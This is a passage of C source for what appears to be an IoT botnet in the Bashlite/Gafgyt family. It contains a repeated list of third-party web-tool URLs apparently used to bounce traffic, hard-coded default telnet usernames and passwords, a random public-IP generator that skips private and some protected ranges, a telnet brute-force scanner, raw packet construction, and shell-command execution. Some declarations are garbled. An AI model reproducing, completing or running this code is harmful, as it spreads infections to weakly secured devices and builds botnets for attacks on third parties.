	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	return(bots)

//Payload Goes Here kekek 
char *infectline = "";

int initConnection();
int getBogos(unsigned char *bogomips);
int getCores();
int getCountry(unsigned char *buf, int bufsize);
void makeRandomStr(unsigned char *buf, int length);
int sockprintf(int sock, char *formatStr, ...);
char *inet_ntoa(struct in_addr in);

 mainCommSock = 0, currentServer = -1, gotIP = 0;
uint32_t *pids;
uint3int2_t scanPid;
uint64_t numpids = 0;
struct in_addr ourIP;
unsigned char macAddress[6] = {0};
char *usernames[] = {"root\0", "admin\0", "user\0", "login\0", "guest\0", "support\0"};
char *passwords[] = {"root\0", "toor\0", "admin\0", "user\0", "guest\0", "login\0", "changeme\0", "1234\0", "12345\0", "123456\0", "default\0", "\0", "password\0", "support\0"};

#define PHI 0x9e3779b9
static uint32_t Q[4096], c = 362436;

void init_rand(uint32_t x)
{
        int i;

        Q[0] = x;
        Q[1] = x + PHI;
        Q[2] = x + PHI + PHI;

        for (i = 3; i < 4096; i++) Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}

uint32_t rand_cmwc(void)
{
        uint64_t t, a = 18782LL;
        static uint32_t i = 4095;
        uint32_t x, r = 0xfffffffe;
        i = (i + 1) & 4095;
        t = a * Q[i] + c;
        c = (uint32_t)(t >> 32);
        x = t + c;
        if (x < c) {
                x++;
                c++;
        }
        return (Q[i] = r - x);
}

void filter(char *a) { while(a[strlen(a)-1] == '\r' || a[strlen(a)-1] == '\n') a[strlen(a)-1]=0; }
char *makestring() {
	char *tmp;
	int len=(rand()%5)+4,i;
 	FILE *file;
	tmp=(char*)malloc(len+1);
 	memset(tmp,0,len+1);
	char *pre;
 	if ((file=fopen("/usr/dict/words","r")) == NULL) for (i=0;i<len;i++) tmp[i]=(rand()%(91-65))+65;
	else {
		int a=((rand()*rand())%45402)+1;
		char buf[1024];
		for (i=0;i<a;i++) fgets(buf,1024,file);
		memset(buf,0,1024);
		fgets(buf,1024,file);
		filter(buf);
		memcpy(tmp,buf,len);
		fclose(file);
	}
	return tmp;
}

static int print(unsigned char **out, const unsigned char *format, va_list args )
{
        register int width, pad;
        register int pc = 0;
        unsigned char scr[2];

        for (; *format != 0; ++format) {
                if (*format == '%') {
                        ++format;
                        width = pad = 0;
                        if (*format == '\0') break;
                        if (*format == '%') goto out;
                        if (*format == '-') {
                                ++format;
                                pad = PAD_RIGHT;
                        }
                        while (*format == '0') {
                                ++format;
                                pad |= PAD_ZERO;
                        }
                        for ( ; *format >= '0' && *format <= '9'; ++format) {
                                width *= 10;
                                width += *format - '0';
                        }
                        if( *format == 's' ) {
                                register char *s = (char *)va_arg( args, int );
                                pc += prints (out, s?s:"(null)", width, pad);
                                continue;
                        }
                        if( *format == 'd' ) {
                                pc += printi (out, va_arg( args, int ), 10, 1, width, pad, 'a');
                                continue;
                        }
                        if( *format == 'x' ) {
                                pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'a');
                                continue;
                        }
                        if( *format == 'X' ) {
                                pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'A');
                                continue;
                        }
                        if( *format == 'u' ) {
                                pc += printi (out, va_arg( args, int ), 10, 0, width, pad, 'a');
                                continue;
                        }
                        if( *format == 'c' ) {
                                scr[0] = (unsigned char)va_arg( args, int );
                                scr[1] = '\0';
                                pc += prints (out, scr, width, pad);
                                continue;
                        }
                }
                else {
out:
                        printchar (out, *format);
                        ++pc;
                }
        }
        if (out) **out = '\0';
        va_end( args );
        return pc;
}

int zprintf(const unsigned char *format, ...)
{
        va_list args;
        va_start( args, format );
        return print( 0, format, args );
}

int szprintf(unsigned char *out, const unsigned char *format, ...)
{
        va_list args;
        va_start( args, format );
        return print( &out, format, args );
}


int sockprintf(int sock, char *formatStr, ...)
{
        unsigned char *textBuffer = malloc(2048);
        memset(textBuffer, 0, 2048);
        char *orig = textBuffer;
        va_list args;
        va_start(args, formatStr);
        print(&textBuffer, formatStr, args);
        va_end(args);
        orig[strlen(orig)] = '\n';
        zprintf("buf: %s\n", orig);
        int q = send(sock,orig,strlen(orig), MSG_NOSIGNAL);
        free(orig);
        return q;
}

static int *fdopen_pids;

int fdpopen(unsigned char *program, register unsigned char *type)
{
        register int iop;
        int pdes[2], fds, pid;

        if (*type != 'r' && *type != 'w' || type[1]) return -1;

        if (pipe(pdes) < 0) return -1;
        if (fdopen_pids == NULL) {
                if ((fds = getdtablesize()) <= 0) return -1;
                if ((fdopen_pids = (int *)malloc((unsigned int)(fds * sizeof(int)))) == NULL) return -1;
                memset((unsigned char *)fdopen_pids, 0, fds * sizeof(int));
        }

        switch (pid = vfork())
        {
        case -1:
                close(pdes[0]);
                close(pdes[1]);
                return -1;
        case 0:
                if (*type == 'r') {
                        if (pdes[1] != 1) {
                                dup2(pdes[1], 1);
                                close(pdes[1]);
                        }
                        close(pdes[0]);
                } else {
                        if (pdes[0] != 0) {
                                (void) dup2(pdes[0], 0);
                                (void) close(pdes[0]);
                        }
                        (void) close(pdes[1]);
                }
                execl("/bin/sh", "sh", "-c", program, NULL);
                _exit(127);
        }
        if (*type == 'r') {
                iop = pdes[0];
                (void) close(pdes[1]);
        } else {
                iop = pdes[1];
                (void) close(pdes[0]);
        }
        fdopen_pids[iop] = pid;
        return (iop);
}

int fdpclose(int iop)
{
        register int fdes;
        sigset_t omask, nmask;
        int pstat;
        register int pid;

        if (fdopen_pids == NULL || fdopen_pids[iop] == 0) return (-1);
        (void) close(iop);
        sigemptyset(&nmask);
        sigaddset(&nmask, SIGINT);
        sigaddset(&nmask, SIGQUIT);
        sigaddset(&nmask, SIGHUP);
        (void) sigprocmask(SIG_BLOCK, &nmask, &omask);
        do {
                pid = waitpid(fdopen_pids[iop], (int *) &pstat, 0);
        } while (pid == -1 && errno == EINTR);
        (void) sigprocmask(SIG_SETMASK, &omask, NULL);
        fdopen_pids[fdes] = 0;
        return (pid == -1 ? -1 : WEXITSTATUS(pstat));
}

unsigned char *fdgets(unsigned char *buffer, int bufferSize, int fd)
{
        int got = 1, total = 0;
        while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
        return got == 0 ? NULL : buffer;
}

static const long hextable[] = {
        [0 ... 255] = -1,
        ['0'] = 0, 1, 2, 3, 4, 5, 6, 7, 8, 9,
        ['A'] = 10, 11, 12, 13, 14, 15,
        ['a'] = 10, 11, 12, 13, 14, 15
};

long parseHex(unsigned char *hex)
{
        long ret = 0;
        while (*hex && ret >= 0) ret = (ret << 4) | hextable[*hex++];
        return ret;
}

int wildString(const unsigned char* pattern, const unsigned char* string) {
        switch(*pattern)
        {
        case '\0': return *string;
        case '*': return !(!wildString(pattern+1, string) || *string && !wildString(pattern, string+1));
        case '?': return !(*string && !wildString(pattern+1, string+1));
        default: return !((toupper(*pattern) == toupper(*string)) && !wildString(pattern+1, string+1));
        }
}

int getHost(unsigned char *toGet, struct in_addr *i)
{
        struct hostent *h;
        if((i->s_addr = inet_addr(toGet)) == -1) return 1;
        return 0;
}

void uppercase(unsigned char *str)
{
        while(*str) { *str = toupper(*str); str++; }
}

int getBogos(unsigned char *bogomips)
{
        int cmdline = open("/proc/cpuinfo", O_RDONLY);
        char linebuf[4096];
        while(fdgets(linebuf, 4096, cmdline) != NULL)
        {
                uppercase(linebuf);
                if(strstr(linebuf, "BOGOMIPS") == linebuf)
                {
                        unsigned char *pos = linebuf + 8;
                        while(*pos == ' ' || *pos == '\t' || *pos == ':') pos++;
                        while(pos[strlen(pos)-1] == '\r' || pos[strlen(pos)-1] == '\n') pos[strlen(pos)-1]=0;
                        if(strchr(pos, '.') != NULL) *strchr(pos, '.') = 0x00;
                        strcpy(bogomips, pos);
                        close(cmdline);
                        return 0;
                }
                memset(linebuf, 0, 4096);
        }
        close(cmdline);
        return 1;
}

int getCores()
{
        int totalcores = 0;
        int cmdline = open("/proc/cpuinfo", O_RDONLY);
        char linebuf[4096];
        while(fdgets(linebuf, 4096, cmdline) != NULL)
        {
                uppercase(linebuf);
                if(strstr(linebuf, "BOGOMIPS") == linebuf) totalcores++;
                memset(linebuf, 0, 4096);
        }
        close(cmdline);
        return totalcores;

}

void makeRandomStr(unsigned char *buf, int length)
{
        int i = 0;
        for(i = 0; i < length; i++) buf[i] = (rand_cmwc()%(91-65))+65;
}

int recvLine(int socket, unsigned char *buf, int bufsize)
{
        memset(buf, 0, bufsize);

        fd_set myset;
        struct timeval tv;
        tv.tv_sec = 30;
        tv.tv_usec = 0;
        FD_ZERO(&myset);
        FD_SET(socket, &myset);
        int selectRtn, retryCount;
        if ((selectRtn = select(socket+1, &myset, NULL, &myset, &tv)) <= 0) {
                while(retryCount < 10)
                {
                        sockprintf(mainCommSock, "PING");

                        tv.tv_sec = 30;
                        tv.tv_usec = 0;
                        FD_ZERO(&myset);
                        FD_SET(socket, &myset);
                        if ((selectRtn = select(socket+1, &myset, NULL, &myset, &tv)) <= 0) {
                                retryCount++;
                                continue;
                        }

                        break;
                }
        }

        unsigned char tmpchr;
        unsigned char *cp;
        int count = 0;

        cp = buf;
        while(bufsize-- > 1)
        {
                if(recv(mainCommSock, &tmpchr, 1, 0) != 1) {
                        *cp = 0x00;
                        return -1;
                }
                *cp++ = tmpchr;
                if(tmpchr == '\n') break;
                count++;
        }
        *cp = 0x00;

//      zprintf("recv: %s\n", cp);

        return count;
}

int connectTimeout(int fd, char *host, int port, int timeout)
{
        struct sockaddr_in dest_addr;
        fd_set myset;
        struct timeval tv;
        socklen_t lon;

        int valopt;
        long arg = fcntl(fd, F_GETFL, NULL);
        arg |= O_NONBLOCK;
        fcntl(fd, F_SETFL, arg);

        dest_addr.sin_family = AF_INET;
        dest_addr.sin_port = htons(port);
        if(getHost(host, &dest_addr.sin_addr)) return 0;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
        int res = connect(fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

        if (res < 0) {
                if (errno == EINPROGRESS) {
                        tv.tv_sec = timeout;
                        tv.tv_usec = 0;
                        FD_ZERO(&myset);
                        FD_SET(fd, &myset);
                        if (select(fd+1, NULL, &myset, NULL, &tv) > 0) {
                                lon = sizeof(int);
                                getsockopt(fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
                                if (valopt) return 0;
                        }
                        else return 0;
                }
                else return 0;
        }

        arg = fcntl(fd, F_GETFL, NULL);
        arg &= (~O_NONBLOCK);
        fcntl(fd, F_SETFL, arg);

        return 1;
}

int listFork()
{
        uint32_t parent, *newpids, i;
        parent = fork();
        if (parent <= 0) return parent;
        numpids++;
        newpids = (uint32_t*)malloc((numpids + 1) * 4);
        for (i = 0; i < numpids - 1; i++) newpids[i] = pids[i];
        newpids[numpids - 1] = parent;
        free(pids);
        pids = newpids;
        return parent;
}

int negotiate(int sock, unsigned char *buf, int len)
{
        unsigned char c;

        switch (buf[1]) {
        case CMD_IAC: /*dropped an extra 0xFF wh00ps*/ return 0;
        case CMD_WILL:
        case CMD_WONT:
        case CMD_DO:
        case CMD_DONT:
                c = CMD_IAC;
                send(sock, &c, 1, MSG_NOSIGNAL);
                if (CMD_WONT == buf[1]) c = CMD_DONT;
                else if (CMD_DONT == buf[1]) c = CMD_WONT;
                else if (OPT_SGA == buf[1]) c = (buf[1] == CMD_DO ? CMD_WILL : CMD_DO);
                else c = (buf[1] == CMD_DO ? CMD_WONT : CMD_DONT);
                send(sock, &c, 1, MSG_NOSIGNAL);
                send(sock, &(buf[2]), 1, MSG_NOSIGNAL);
                break;

        default:
                break;
        }

        return 0;
}

int matchPrompt(char *bufStr)
{
        char *prompts = ":>%$#\0";

        int bufLen = strlen(bufStr);
        int i, q = 0;
        for(i = 0; i < strlen(prompts); i++)
        {
                while(bufLen > q && (*(bufStr + bufLen - q) == 0x00 || *(bufStr + bufLen - q) == ' ' || *(bufStr + bufLen - q) == '\r' || *(bufStr + bufLen - q) == '\n')) q++;
                if(*(bufStr + bufLen - q) == prompts[i]) return 1;
        }

        return 0;
}

int readUntil(int fd, char *toFind, int matchLePrompt, int timeout, int timeoutusec, char *buffer, int bufSize, int initialIndex)
{
        int bufferUsed = initialIndex, got = 0, found = 0;
        fd_set myset;
        struct timeval tv;
        tv.tv_sec = timeout;
        tv.tv_usec = timeoutusec;
        unsigned char *initialRead = NULL;

        while(bufferUsed + 2 < bufSize && (tv.tv_sec > 0 || tv.tv_usec > 0))
        {
                FD_ZERO(&myset);
                FD_SET(fd, &myset);
                if (select(fd+1, &myset, NULL, NULL, &tv) < 1) break;
                initialRead = buffer + bufferUsed;
                got = recv(fd, initialRead, 1, 0);
                if(got == -1 || got == 0) return 0;
                bufferUsed += got;
                if(*initialRead == 0xFF)
                {
                        got = recv(fd, initialRead + 1, 2, 0);
                        if(got == -1 || got == 0) return 0;
                        bufferUsed += got;
                        if(!negotiate(fd, initialRead, 3)) return 0;
                } else {
                        if(strstr(buffer, toFind) != NULL || (matchLePrompt && matchPrompt(buffer))) { found = 1; break; }
                }
        }

        if(found) return 1;
        return 0;
}


static uint8_t ipState[4];
in_addr_t getRandomPublicIP()
{

	if (ipState[0] < 255 && ipState[1] < 255 && ipState[2] < 255 && ipState[3] < 255)
	{
		ipState[0]++;
		ipState[1]++;
		ipState[2]++;
		ipState[3]++;

		char ip[16];

		szprintf(ip, "%d.%d.%d.%d", ipState[0], ipState[1], ipState[2], ipState[3]);

		return inet_addr(ip);
	}
	
	ipState[0] = rand() % 255;
	ipState[1] = rand() % 255;
	ipState[2] = rand() % 255;
	ipState[3] = rand() % 255;

	while(
		(ipState[0] == 0) ||
		(ipState[0] == 10) ||
		(ipState[0] == 100 && (ipState[1] >= 64 && ipState[1] <= 127)) ||
		(ipState[0] == 127) ||
		(ipState[0] == 169 && ipState[1] == 254) ||
		(ipState[0] == 172 && (ipState[1] <= 16 && ipState[1] <= 31)) ||
		(ipState[0] == 192 && ipState[1] == 0 && ipState[2] == 2) ||
		(ipState[0] == 192 && ipState[1] == 88 && ipState[2] == 99) ||
		(ipState[0] == 192 && ipState[1] == 168) ||
		(ipState[0] == 198 && (ipState[1] == 18 || ipState[1] == 19)) ||
		(ipState[0] == 198 && ipState[1] == 51 && ipState[2] == 100) ||
		(ipState[0] == 203 && ipState[1] == 0 && ipState[2] == 113) ||
		(ipState[0] == 188 && ipState[1] == 209 && ipState[2] == 52) ||
		(ipState[0] == 188 && ipState[1] == 209 && ipState[2] == 49) ||
		(ipState[0] == 185 && ipState[1] == 62 && ipState[2] == 190) ||
		(ipState[0] == 185 && ipState[1] == 62 && ipState[2] == 189) ||
		(ipState[0] == 185 && ipState[1] == 62 && ipState[2] == 188) ||
		(ipState[0] == 185 && ipState[1] == 61 && ipState[2] == 137) ||
		(ipState[0] == 185 && ipState[1] == 61 && ipState[2] == 136) ||
		(ipState[0] == 185 && ipState[1] == 11 && ipState[2] == 147) ||
		(ipState[0] == 185 && ipState[1] == 11 && ipState[2] == 146) ||
		(ipState[0] == 185 && ipState[1] == 11 && ipState[2] == 145) ||
		(ipState[0] == 63 && ipState[1] == 141 && ipState[2] == 241) ||
		(ipState[0] == 69 && ipState[1] == 30 && ipState[2] == 192) ||
		(ipState[0] == 69 && ipState[1] == 30 && ipState[2] == 244) ||
		(ipState[0] == 69 && ipState[1] == 197 && ipState[2] == 128) ||
		(ipState[0] == 162 && ipState[1] == 251 && ipState[2] == 120) ||
		(ipState[0] == 173 && ipState[1] == 208 && ipState[2] == 128) ||
		(ipState[0] == 173 && ipState[1] == 208 && ipState[2] == 180) ||
		(ipState[0] == 173 && ipState[1] == 208 && ipState[2] == 250) ||
		(ipState[0] == 192 && ipState[1] == 187 && ipState[2] == 113) ||
		(ipState[0] == 198 && ipState[1] == 204 && ipState[2] == 241) ||
		(ipState[0] == 204 && ipState[1] == 10 && ipState[2] == 160) ||
		(ipState[0] == 204 && ipState[1] == 12 && ipState[2] == 192) ||
		(ipState[0] == 208 && ipState[1] == 110 && ipState[2] == 64) ||
		(ipState[0] == 208 && ipState[1] == 110 && ipState[2] == 72) ||
		(ipState[0] == 208 && ipState[1] == 67) ||
		(ipState[0] == 94 && ipState[1] == 102 && ipState[2] == 48) ||
		(ipState[0] == 93 && ipState[1] == 174 && ipState[2] == 88) ||
		(ipState[0] == 89 && ipState[1] == 248 && ipState[2] == 174) ||
		(ipState[0] == 89 && ipState[1] == 248 && ipState[2] == 172) ||
		(ipState[0] == 89 && ipState[1] == 248 && ipState[2] == 170) ||
		(ipState[0] == 89 && ipState[1] == 248 && ipState[2] == 169) ||
		(ipState[0] == 89 && ipState[1] == 248 && ipState[2] == 160) ||
		(ipState[0] >= 224)
		)

        {
			ipState[0] = rand() % 255;
			ipState[1] = rand() % 255;
			ipState[2] = rand() % 255;
			ipState[3] = rand() % 255;
		}

	char ip[16];

	szprintf(ip, "%d.%d.%d.%d", ipState[0], ipState[1], ipState[2], ipState[3]);

	return inet_addr(ip);
}

in_addr_t getRandomIP(in_addr_t netmask)
{
	in_addr_t tmp = ntohl(ourIP.s_addr) & netmask;

	return tmp ^ ( rand_cmwc() & ~netmask);
}

unsigned short csum (unsigned short *buf, int count)
{
        register uint64_t sum = 0;
        while( count > 1 ) { sum += *buf++; count -= 2; }
        if(count > 0) { sum += *(unsigned char *)buf; }
        while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
        return (uint16_t)(~sum);
}

unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph)
{

        struct tcp_pseudo
        {
                unsigned long src_addr;
                unsigned long dst_addr;
                unsigned char zero;
                unsigned char proto;
                unsigned short length;
        } pseudohead;
        unsigned short total_len = iph->tot_len;
        pseudohead.src_addr=iph->saddr;
        pseudohead.dst_addr=iph->daddr;
        pseudohead.zero=0;
        pseudohead.proto=IPPROTO_TCP;
        pseudohead.length=htons(sizeof(struct tcphdr));
        int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
        unsigned short *tcp = malloc(totaltcp_len);
        memcpy((unsigned char *)tcp,&pseudohead,sizeof(struct tcp_pseudo));
        memcpy((unsigned char *)tcp+sizeof(struct tcp_pseudo),(unsigned char *)tcph,sizeof(struct tcphdr));
        unsigned short output = csum(tcp,totaltcp_len);
        free(tcp);
        return output;
}

void makeIPPacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize)
{
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + packetSize;
        iph->id = rand_cmwc();
        iph->frag_off = 0;
        iph->ttl = MAXTTL;
        iph->protocol = protocol;
        iph->check = 0;
        iph->saddr = source;
        iph->daddr = dest;
}

int sclose(int fd)
{
        if(3 > fd) return 1;
        close(fd);
        return 0;
}


void StartTheLelz()
{
        int max = (getdtablesize() / 4) * 3, i, res;
        fd_set myset;
        struct timeval tv;
        socklen_t lon;
        int valopt;

        max = max > 4096 ? 4096 : max;

        struct sockaddr_in dest_addr;
        dest_addr.sin_family = AF_INET;
        dest_addr.sin_port = htons(23);
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

        struct telstate_t
        {
                int fd;
                uint32_t ip;
                uint8_t state;
                uint8_t complete;
                uint8_t usernameInd;
                uint8_t passwordInd;
                uint32_t totalTimeout;
                uint16_t bufUsed;
                char *sockbuf;
        } fds[max];
        memset(fds, 0, max * (sizeof(int) + 1));
        for(i = 0; i < max; i++) { fds[i].complete = 1; fds[i].sockbuf = malloc(1024); memset(fds[i].sockbuf, 0, 1024); }
    	struct timeval timeout;
    	timeout.tv_sec = 5;
    	timeout.tv_usec = 0;
        while(1)
        {
                for(i = 0; i < max; i++)
                {
                        switch(fds[i].state)
                        {
                        case 0:
                                {
                                        memset(fds[i].sockbuf, 0, 1024);

                                        if(fds[i].complete) { char *tmp = fds[i].sockbuf; memset(&(fds[i]), 0, sizeof(struct telstate_t)); fds[i].sockbuf = tmp; fds[i].ip = getRandomPublicIP(); }
                                        else {
                                                fds[i].passwordInd++;
                                                if(fds[i].passwordInd == sizeof(passwords) / sizeof(char *)) { fds[i].passwordInd = 0; fds[i].usernameInd++; }
                                                if(fds[i].usernameInd == sizeof(usernames) / sizeof(char *)) { fds[i].complete = 1; continue; }
                                        }
                                        dest_addr.sin_family = AF_INET;
                                        dest_addr.sin_port = htons(23);
                                        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
                                        dest_addr.sin_addr.s_addr = fds[i].ip;
                                        fds[i].fd = socket(AF_INET, SOCK_STREAM, 0);
                                        setsockopt (fds[i].fd, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));
                                        setsockopt (fds[i].fd, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout, sizeof(timeout));
                                        if(fds[i].fd == -1) { continue; }
                                        fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK);
                                        if(connect(fds[i].fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) == -1 && errno != EINPROGRESS) { /*printf("close %lu\n",fds[i].ip);*/ sclose(fds[i].fd); fds[i].complete = 1; }
                                        else { fds[i].state = 1; fds[i].totalTimeout = 0; }
                                }
                                break;

                        case 1:
                                {
                                        if(fds[i].totalTimeout == 0) fds[i].totalTimeout = time(NULL);

                                        FD_ZERO(&myset);
                                        FD_SET(fds[i].fd, &myset);
                                        tv.tv_sec = 0;
                                        tv.tv_usec = 10000;
                                        res = select(fds[i].fd+1, NULL, &myset, NULL, &tv);
                                        if(res == 1)
                                        {
                                                lon = sizeof(int);
                                                valopt = 0;
                                                getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
                                                if(valopt)
                                                {
                                                        sclose(fds[i].fd);
                                                        fds[i].state = 0;
                                                        fds[i].complete = 1;
                                                } else {
                                                        fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) & (~O_NONBLOCK));
                                                        fds[i].totalTimeout = 0;
                                                        fds[i].bufUsed = 0;
                                                        memset(fds[i].sockbuf, 0, 1024);
                                                        fds[i].state = 2;
                                                        continue;
                                                }
                                        } else if(res == -1)
                                        {
                                                sclose(fds[i].fd);
                                                fds[i].state = 0;
                                                fds[i].complete = 1;
                                        }

                                        if(fds[i].totalTimeout + 5 < time(NULL)) //was if(fds[i].totalTimeout + 5 < time(NULL))
                                        {
                                                sclose(fds[i].fd);
                                                fds[i].state = 0;
                                                fds[i].complete = 1;
                                        }
                                }
                                break;

                        case 2:
                                {
                                        if(fds[i].totalTimeout == 0) fds[i].totalTimeout = time(NULL);
					if(matchPrompt(fds[i].sockbuf)) {
                        			fds[i].state = 7;
                    			}

                                        if(readUntil(fds[i].fd, "ogin:", 0, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
                                        {
                                                fds[i].totalTimeout = 0;
                                                fds[i].bufUsed = 0;
                                                memset(fds[i].sockbuf, 0, 1024);
                                                fds[i].state = 3;
                                                continue;
                                        } else {
                                                fds[i].bufUsed = strlen(fds[i].sockbuf);
                                        }

                                        if(fds[i].totalTimeout + 30 < time(NULL))
                                        {
                                                sclose(fds[i].fd);
                                                fds[i].state = 0;
                                                fds[i].complete = 1;
                                        }
                                }
                                break;

                        case 3:
                                {
                                        if(send(fds[i].fd, usernames[fds[i].usernameInd], strlen(usernames[fds[i].usernameInd]), MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
                                        if(send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
                                        fds[i].state = 4;
                                }
                                break;

                        case 4:
                                {
                                        if(fds[i].totalTimeout == 0) fds[i].totalTimeout = time(NULL);

                                        if(readUntil(fds[i].fd, "assword:", 1, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
                                        {
                                                fds[i].totalTimeout = 0;
                                                fds[i].bufUsed = 0;
